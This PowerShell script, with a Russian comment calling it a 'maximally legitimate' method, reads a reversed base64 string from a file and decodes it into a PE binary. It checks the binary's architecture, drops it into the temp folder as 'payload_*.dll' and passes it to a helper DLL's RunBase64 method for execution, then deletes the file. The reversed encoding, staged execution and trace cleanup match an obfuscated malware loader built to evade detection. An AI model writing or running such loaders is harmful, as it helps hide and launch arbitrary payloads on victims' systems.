﻿# 1.ps1 — максимально легитимный способ: пишем dll во временный файл и грузим через Add-Type

$ErrorActionPreference = 'Stop'

function Get-Payload {
    param([string]$File)

    if (-not (Test-Path $File)) { throw "File not found: $File" }

    $raw = Get-Content -Raw -Path $File
    if ([string]::IsNullOrWhiteSpace($raw)) { throw "Base64 file is empty" }

    $chars = $raw.ToCharArray()
    [Array]::Reverse($chars)
    $fixed = -join $chars

    [PSCustomObject]@{
        Bytes  = [Convert]::FromBase64String($fixed)
        Base64 = $fixed
    }
}

function Get-PEArch {
    param([byte[]]$Bytes)
    if ($Bytes.Length -lt 0x100) { return "unknown" }
    if ($Bytes[0] -ne 0x4D -or $Bytes[1] -ne 0x5A) { return "unknown" }
    $e_lfanew = [BitConverter]::ToInt32($Bytes, 0x3C)
    if ($e_lfanew -lt 0 -or ($e_lfanew + 0x18) -ge $Bytes.Length) { return "unknown" }
    if ($Bytes[$e_lfanew] -ne 0x50 -or $Bytes[$e_lfanew+1] -ne 0x45) { return "unknown" }
    $magic = [BitConverter]::ToUInt16($Bytes, $e_lfanew + 0x18)
    switch ($magic) { 0x10B { "x86" } 0x20B { "x64" } default { "unknown" } }
}

# === MAIN ===
$dllPath    = (Resolve-Path ".\Company.SafeIngest.dll").Path
$base64Path = (Resolve-Path ".\base64.txt").Path

$payload    = Get-Payload $base64Path
$arch       = Get-PEArch $payload.Bytes
$bytes      = $payload.Bytes

$tempDll = Join-Path $env:TEMP ("payload_" + [guid]::NewGuid().ToString("N") + ".dll")
[System.IO.File]::WriteAllBytes($tempDll, $bytes)

try {
    Add-Type -Path $dllPath -ErrorAction Stop
    $instance = New-Object Company.SafeIngest.SafeIngest
    $instance.RunBase64([Convert]::ToBase64String([IO.File]::ReadAllBytes($tempDll)))
}
finally {
    Remove-Item $tempDll -ErrorAction SilentlyContinue
}
